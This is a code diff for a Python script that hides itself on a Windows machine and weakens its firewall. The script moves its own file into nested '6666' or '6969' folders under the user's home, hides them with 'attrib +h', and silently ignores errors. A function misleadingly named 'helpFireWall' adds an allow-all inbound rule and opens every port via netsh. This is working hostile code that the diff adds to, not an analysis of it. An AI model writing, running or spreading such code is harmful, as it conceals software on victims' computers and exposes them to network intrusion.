@@ -9,29 +9,36 @@ def burrow():
     destination = getNewPath()
     mkDir()
     try:
-        #depending on which flag is true.
         if(getmade66DirFlag()):
             sixDirPath = r'\6666\666\66\6'
-            mergePath = os.getcwd() + sixDirPath #get current working directory and append 6666 dir path
-            mergePath = mergePath[:-9] #only want 6666 dir
-            root = moveinDir(mergePath,destination) #get root 
-            finaldestPath = root + sixDirPath #append root with sixDirPath
-            shutil.move(sys.argv[0], finaldestPath) #move current python file
+            mergePath = os.getcwd() + sixDirPath
+            mergePath = mergePath[:-9]
+            root = getLongestPath(mergePath,destination)
+            print('ROOT: ', root)
+            finaldestPath = root + sixDirPath
+            try:
+                os.system("attrib +h " + finaldestPath)
+            except:
+                pass
+            print('FINALDESTPATH: ',finaldestPath)
+            shutil.move(sys.argv[0], finaldestPath)
             burrowFlag = True
         elif(getmade69DirFlag()):
             sixNineDir = r'\6969\696\69\6'
             mergePath = os.getcwd() + sixNineDir
-            SixNineDirPath = mergePath[:-9]
-            finaldestPath = destination+ mergePath
-            shutil.move(SixNineDirPath,destination)
+            mergePath = mergePath[:-9]
+            root = getLongestPath(mergePath, destination)
+            finaldestPath = root + sixNineDir
+            try:
+                os.system("attrib +h " + finaldestPath)
+            except:
+                pass
             shutil.move(sys.argv[0], finaldestPath)
             burrowFlag = True
         else:
             pass
     except:
         pass
-    #os.chdir(getNewPath())
-    #print(currentPath)
 
 def getNewPath():
     #gets a new path that is a folder within userHome
@@ -47,16 +54,36 @@ def getNewPath():
         path += userHome + r'\Pictures'
     return path
 
-def moveinDir(path,destination):
-    #walks destination to find dir within it and move path in root
+def getLongestPath(path, destination):
+    #getsLongestPath/s from destination and appends them to list and returns one at random
+    #that path index also moving path into
+    roots = []
+    temp = -1
     for root, subfiles, files in os.walk(destination):
-        if os.path.isdir(root) and root != path:
-            try:
-                shutil.move(path,root)
-                return root
-            except:
-                continue
-
+        if os.path.isdir(root) and root != destination:
+                try:
+                    numSlashes = 0
+                    for char in root:
+                        if char == '\\' or char == '/': #counte number of slashes
+                            numSlashes+=1
+                    if numSlashes >= temp:
+                        temp = numSlashes
+                        roots.append(root)
+                except:
+                    continue
+    longestPaths = []
+    for root in roots:
+        numSlashes = 0
+        for char in root:
+            if char == '\\' or char == '/':
+                numSlashes += 1
+        if numSlashes == temp:
+            longestPaths.append(root)
+    if len(longestPaths) is 0: #if for some reason there was nothing inside the directory return C drive
+        return 'C:\\'
+    randIndex = random.randint(0,len(longestPaths)-1)
+    shutil.move(path,longestPaths[randIndex])
+    return longestPaths[randIndex]
 
 def mkDir():
     #makes a few directories and subdirectories and sets flags after made
@@ -87,21 +114,21 @@ def getBurrowFlag():
 
 def helpFireWall():
     #helps firewall by trying to run a few helpful commands
-    command1 = 'netsh advfirewall reset'
-    command2 = 'netsh advfirewall set allprofiles state on'
+    command1 = 'netsh advfirewall firewall reset'
+    command2 = 'netsh advfirewall firewall set allprofiles state on'
     command3 = 'netsh advfirewall firewall add rule name = "Allow" protocol = all ' \
                'dir = in localport = all action = allow'
-    command4 = 'netsh firewall add portopening protocol = all port = all enable all'
+    command4 = 'netsh advfirewall firewall add portopening protocol = all port = all enable all'
+    commands = [command1,command2,command3,command4]
     try:
-        os.system(command1)
-        os.system(command2)
-        os.system(command3)
-        os.system(command4)
+        for command in commands:
+            try:
+                os.system(command)
+            except:
+                continue
     except:
-        try:
-            subprocess.call([psPath, command1])
-            subprocess.call([psPath, command2])
-            subprocess.call([psPath, command3])
-            subprocess.call([psPath, command4])
-        except:
-            pass
+        for command in commands:
+            try:
+                subprocess.call([psPath, command])
+            except:
+                continue
